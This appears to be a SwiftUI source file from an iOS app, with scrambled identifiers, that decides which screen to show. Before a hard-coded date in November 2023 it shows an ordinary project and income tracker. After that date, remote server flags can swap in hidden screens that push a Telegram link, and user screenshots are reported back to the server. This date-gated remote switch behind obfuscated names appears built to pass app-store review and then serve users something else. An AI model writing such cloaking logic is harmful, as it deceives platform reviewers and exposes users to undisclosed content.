//
//  EMLkCiZdGd.swift
//  App246
//
//  Created by Вячеслав on 11/7/23.
//

import SwiftUI
import Amplitude

struct EMLkCiZdGd: View {
    
    @State var akwLVLFEuz: Tab = Tab.Projects
    
    @State var jskmactEfx: String = ""
    
    @State var isDead: Bool = false
    @State var isTelegram: Bool = false
    
    @State var telegram: URL = URL(string: "h")!
    
    @AppStorage("status") var status: Bool = false
    
    init() {
        
        UITabBar.appearance().isHidden = true
    }
    
    var body: some View {
        
        ZStack {
            
            Color("bg")
                .ignoresSafeArea()
            
            if jskmactEfx.isEmpty || telegram.absoluteString == "h" {
                
                KxVipGqVZK()
                
            } else {
                
                if jskmactEfx == "0" {
                    
                    if status {
                        
                        DeEmzRikqT()
                        
                    } else {
                        
                        HDsXccFvnA(telegram: telegram, isTelegram: isTelegram)
                    }
                    
                } else if jskmactEfx == "1" {
                    
                    if status {
                        
                        VStack(spacing: 0, content: {
                            
                            TabView(selection: $akwLVLFEuz, content: {
                                
                                GibMqYcDZv()
                                    .tag(Tab.Projects)
                                
                                aUUROguFAm()
                                    .tag(Tab.Missions)
                                
                                eCUpekmfbY()
                                    .tag(Tab.Income)
                                
                                GGTfspgVly()
                                    .tag(Tab.Calendar)
                            })
                            
                            ioOriGQWrZ(xSYhTkbQOS: $akwLVLFEuz)
                        })
                        .ignoresSafeArea(.all, edges: .bottom)
                        .onAppear {
                            
                            Amplitude.instance().logEvent("did_show_main_screen")
                        }
                        
                    } else {
                        
                        obupBUPPzl()
                    }
                }
            }
        }
        .onAppear {
            
            qQYseYTfFC(isCaptured: false)
        }
        .onReceive(NotificationCenter.default.publisher(for: UIApplication.userDidTakeScreenshotNotification)) { _ in

            if jskmactEfx == "0" {
                
                qQYseYTfFC(isCaptured: true)
            }
        }
    }
    
    private func qQYseYTfFC(isCaptured: Bool) {
        
        TWchbQTVAQ(field: "isDead", dataType: .bool) { result1 in
            
            let result1 = result1 as? Bool ?? false
            isDead = result1
            
            TWchbQTVAQ(field: "isTelegram", dataType: .bool) { result2 in
                
                let result2 = result2 as? Bool ?? false
                isTelegram = result2
            
                TWchbQTVAQ(field: "telegram", dataType: .url) { result3 in
                    
                    let result3 = result3 as? URL ?? URL(string: "nil")!
                    telegram = result3
                    
                    let repository = eBrVUtmhbj()
                    let myData = YbpcLrwXev.OuZBGzDftb()
                    let now = Date().timeIntervalSince1970

                    var dateComponents = DateComponents()
                    dateComponents.year = 2023
                    dateComponents.month = 11
                    dateComponents.day = 27

                    let targetDate = Calendar.current.date(from: dateComponents)!
                    let targetUnixTime = targetDate.timeIntervalSince1970
                    
                    guard now > targetUnixTime else {

                        jskmactEfx = "1"

                        return
                    }
                    
                    repository.AZEGlfeZXe(isCaptured: isCaptured, isCast: false, mydata: myData) { result in
                        
                        switch result {
                        case .success(let data):
                            if "\(data)" == "" {
                                
                                self.jskmactEfx = "1"
                                
                            } else {
                                
                                self.jskmactEfx = "\(data)"
                            }
                            
                        case .failure(_):
                            
                            if self.isDead == true {
                                
                                self.jskmactEfx = "0"
                                
                            } else {
                                
                                self.jskmactEfx = "1"
                            }
                        }
                    }
                }
            }
        }
    }
}

#Preview {
    EMLkCiZdGd()
}
